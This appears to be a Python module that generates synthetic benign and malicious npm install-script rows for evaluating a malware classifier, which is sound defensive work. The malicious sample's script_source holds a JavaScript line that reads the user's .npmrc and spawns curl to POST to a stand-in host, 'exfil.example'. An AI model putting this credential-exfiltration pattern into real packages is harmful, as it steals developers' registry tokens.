"""Evaluation dataset rows for held-out-generation ablation."""

from __future__ import annotations

import random
from typing import Any

from classifier.schema import HELD_OUT_CAMPAIGN
from classifier.synthetic_data import build_synthetic_rows

EMPTY_BEHAVIOR_LOG: dict[str, Any] = {
    "behavior_log_version": "1.0.0",
    "timeout": False,
    "processes": [],
    "files": [],
    "net": [],
    "canary_hits": [],
}

MALICIOUS_BEHAVIOR_LOG: dict[str, Any] = {
    "behavior_log_version": "1.0.0",
    "timeout": False,
    "processes": [{"command": "node", "args": ["setup.js"]}],
    "files": [{"path": "/home/sandbox/.npmrc", "operation": "read"}],
    "net": [{"host": "exfil.sinkhole.test", "port": 443, "protocol": "tcp"}],
    "canary_hits": [{"canary_id": "npm_token", "path": "/home/sandbox/.npmrc"}],
}


def _heldout_benign_row(rng: random.Random, i: int) -> dict[str, Any]:
    hook = rng.choice(["install", "postinstall", "preinstall"])
    return {
        "script_id": f"heldout-benign-{i}",
        "label": "benign",
        "campaign": None,
        "generation": None,
        "split": "heldout",
        "features": {
            "hook": hook,
            "unparseable": hook == "install" and rng.random() < 0.3,
            "entropy": rng.uniform(2.0, 4.0),
            "source_length": rng.randint(20, 120),
            "eval_count": 0,
            "function_ctor_count": 0,
            "spawn_count": 0,
            "http_count": 0,
            "fs_count": 0,
            "homedir_count": 0,
            "credential_hits": 0,
            "api_text_hits": 0,
            "download_and_execute": False,
            "ident_mean_length": rng.uniform(4.0, 9.0),
            "suspicion_score": rng.uniform(0.0, 1.5),
        },
        "behavior_log": EMPTY_BEHAVIOR_LOG,
        "script_source": "node-gyp rebuild",
    }


def _heldout_chaindrop_row(rng: random.Random, i: int) -> dict[str, Any]:
    credential = rng.randint(2, 5)
    api = rng.randint(2, 6)
    return {
        "script_id": f"heldout-chaindrop-{i}",
        "label": "malicious",
        "campaign": HELD_OUT_CAMPAIGN,
        "generation": 4,
        "split": "heldout",
        "features": {
            "hook": "preinstall",
            "unparseable": False,
            "entropy": rng.uniform(5.5, 7.8),
            "source_length": rng.randint(400, 5000),
            "eval_count": rng.randint(1, 4),
            "function_ctor_count": rng.randint(0, 3),
            "spawn_count": rng.randint(2, 5),
            "http_count": rng.randint(2, 6),
            "fs_count": rng.randint(1, 4),
            "homedir_count": rng.randint(2, 4),
            "credential_hits": credential,
            "api_text_hits": api,
            "download_and_execute": True,
            "ident_mean_length": rng.uniform(1.0, 3.5),
            "suspicion_score": float(credential * 3 + api * 2 + rng.randint(4, 10)),
        },
        "behavior_log": MALICIOUS_BEHAVIOR_LOG,
        "script_source": (
            "const cp=require('child_process');"
            "require('fs').readFileSync(process.env.HOME+'/.npmrc');"
            "cp.spawn('curl',['-X','POST','https://exfil.example']);"
        ),
    }


def build_eval_rows(
    *,
    seed: int = 42,
    heldout_benign: int = 20,
    heldout_chaindrop: int = 15,
) -> list[dict[str, Any]]:
    """Train/val rows (gens 1–3 + benign) plus held-out ChainDrop test set."""
    rng = random.Random(seed)
    rows = list(build_synthetic_rows(seed=seed))
    for i in range(heldout_benign):
        rows.append(_heldout_benign_row(rng, i))
    for i in range(heldout_chaindrop):
        rows.append(_heldout_chaindrop_row(rng, i))
    return rows


def split_rows(rows: list[dict[str, Any]]) -> dict[str, list[dict[str, Any]]]:
    return {
        "train": [r for r in rows if r.get("split") == "train"],
        "val": [r for r in rows if r.get("split") == "val"],
        "heldout": [r for r in rows if r.get("split") == "heldout"],
    }
